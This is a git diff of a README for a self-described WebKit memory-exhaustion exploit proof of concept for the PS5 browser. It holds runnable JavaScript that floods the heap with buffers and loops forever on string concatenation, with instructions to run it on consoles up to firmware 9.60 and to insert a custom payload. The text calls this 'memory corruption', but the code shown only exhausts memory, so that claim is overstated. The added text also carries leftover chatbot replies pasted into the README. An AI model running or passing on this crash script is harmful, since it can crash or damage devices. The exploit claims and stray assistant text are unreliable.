@@ -1,27 +1,25 @@
-https://seregonwar.github.io/Overflow/
+# Overflow WebKit Memory Leak PoC
 
-
-**Author:https://x.com/idebty?t=MT_ShLOs9wP9hcH3GNtkNA&s=09**
-I'm self taught I don't know any one in the community if you want to use this use it but credit me.
-# WebKit Memory Leak PoC
+## Link
+Follow this link for the exploit: [Overflow WebKit Memory Leak PoC](https://seregonwar.github.io/Overflow/)
 
 ## Description
-This Proof of Concept (PoC) demonstrates a WebKit memory exhaustion exploit that I have been working on. The current iteration works but still needs to be fully exploited. Below is the JavaScript code that shows how it operates, along with explanations of each step.
+This Proof of Concept (PoC) demonstrates a WebKit memory exhaustion exploit that I've been developing. It is functional in its current form but still requires full exploitation. Below, you'll find the JavaScript code that outlines how the PoC operates, along with an explanation of each step.
 
 ## How it Works
-The code below follows five key steps:
+The code operates in five key steps:
 
-1. **Heap Initialization**: Allocates memory in a controlled manner.
-2. **Heap Grooming**: Manipulates memory to create gaps for the exploit.
-3. **Memory Exhaustion**: Continuously allocates and clears memory to exhaust resources.
-4. **Payload Execution**: Executes the payload to perform memory corruption.
-5. **Exploit Execution**: Runs the steps in sequence to trigger the memory exhaustion.
+1. **Heap Initialization**: Memory is allocated in a controlled manner to prepare for the attack.
+2. **Heap Grooming**: The memory is manipulated to create gaps for exploit insertion.
+3. **Memory Exhaustion**: The system's memory resources are continuously allocated and cleared to exhaust available memory.
+4. **Payload Execution**: The exploit's payload is executed, triggering memory corruption.
+5. **Exploit Execution**: All steps are run sequentially to trigger memory exhaustion and ultimately crash the system.
 
 ## Code
+
 ```javascript
 // Step 1: Initialize Controlled Memory
 function initializeHeap() {
-    //alert("Int heap");
     let buffers = [];
     for (let i = 0; i < 2048; i++) { // Reduced allocations
         buffers.push(new ArrayBuffer(500000)); // Smaller blocks of memory
@@ -31,7 +29,6 @@ function initializeHeap() {
 
 // Step 2: Groom the Heap
 function groomHeap() {
-    //alert("groom heap");
     let tempArray = [];
 
     // Allocate and deallocate in patterns
@@ -63,7 +60,7 @@ function memExh() {
 function payload() {
     let largeString = "B".repeat(900000); // Smaller initial string
     let obj = {};
-    let iterationCount = 0; // Counter to track number of iterations
+    let iterationCount = 0; // Counter to track the number of iterations
 
     while (true) {
         // String concatenation
@@ -81,7 +78,7 @@ function payload() {
 function performExploit() {
     let controlledBuffers = initializeHeap(); // Initialize the heap
     let groomedHeap = groomHeap(); // Groom the heap
-    
+
     // Start memory corruption
     memExh();
 
@@ -89,23 +86,38 @@ function performExploit() {
     payload();
 }
 
+// Execute the exploit
 performExploit();
 ```
-##**Instructions**
 
-1. Copy the above code and run it in a Exploitable PS5(Works Untill guess 9.60?) this might not be useful in ps4
+## Instructions
 
+1. Copy and execute the above code on an exploitable PS5 (works up to version 9.60). This may not be applicable on PS4.
+2. Remember, this is a PoC, and it should be used strictly for educational purposes.
+3. Further testing and analysis are required to fully understand this vulnerability.
+4. If needed, insert your custom payload inside the `payload` function.
 
-2. Be mindful that this is a PoC and should be used for educational purposes only.
+## Disclaimer
+This PoC is for educational purposes only. The author assumes no responsibility for any misuse of this code. 
+Certainly! Here’s the **WARNING** section translated into English and formatted with markdown:
 
+## **WARNING**
 
-3. Further testing is required to fully understand this vulnerability.
+Running this Proof of Concept (PoC) comes with **serious risks** to the target device, including but not limited to:
 
-4.Place Your Payload in the payload function
+1. **Device Bricking**: Incorrect or unmodified execution of this code could result in an **irreversible brick** of the system, rendering it completely unusable. This means the device might stop functioning entirely, with no chance of recovery.
 
-Disclaimer
+2. **Data Loss**: This PoC exploits memory vulnerabilities, which could lead to file corruption or the loss of important data.
 
-This PoC is for educational purposes only. The author is not responsible for any misuse of this code.
-##**IM NOT LIABLE TO ANY DAMAGES CAUSED BY THIS POC OR ANY OTHER USE OF IT THIS CAN BRICK AND MIGHT BRICK YOUR SYSTEM IF LEFT UNEDITED **
+3. **Incompatibility**: The exploit may not work on all firmware versions or devices. Running it on an unsupported system version could cause unexpected and damaging consequences.
 
+4. **Hardware Damage**: Continuous memory exhaustion and allocation could stress the hardware resources, potentially causing long-term physical damage to the device.
 
+5. **Legal Risks**: Unauthorized use of exploits or vulnerabilities on devices you do not own, or without explicit consent, could violate local laws or licensing agreements.
+
+**DO NOT** run this code on critical devices or on devices that you are not prepared to lose. Modify the PoC and fully understand its workings before executing it to minimize risks. **The author is not responsible for any damage caused by using this code.**
+
+Let me know if you need further adjustments!
+## Credit
+The credits for the structure on which this tool is based were written by the aforementioned idebty, the credits are therefore assigned to him for having found the flaw, I have only expanded the operation!:
+**Author**: [idebty](https://x.com/idebty?t=MT_ShLOs9wP9hcH3GNtkNA&s=09)  
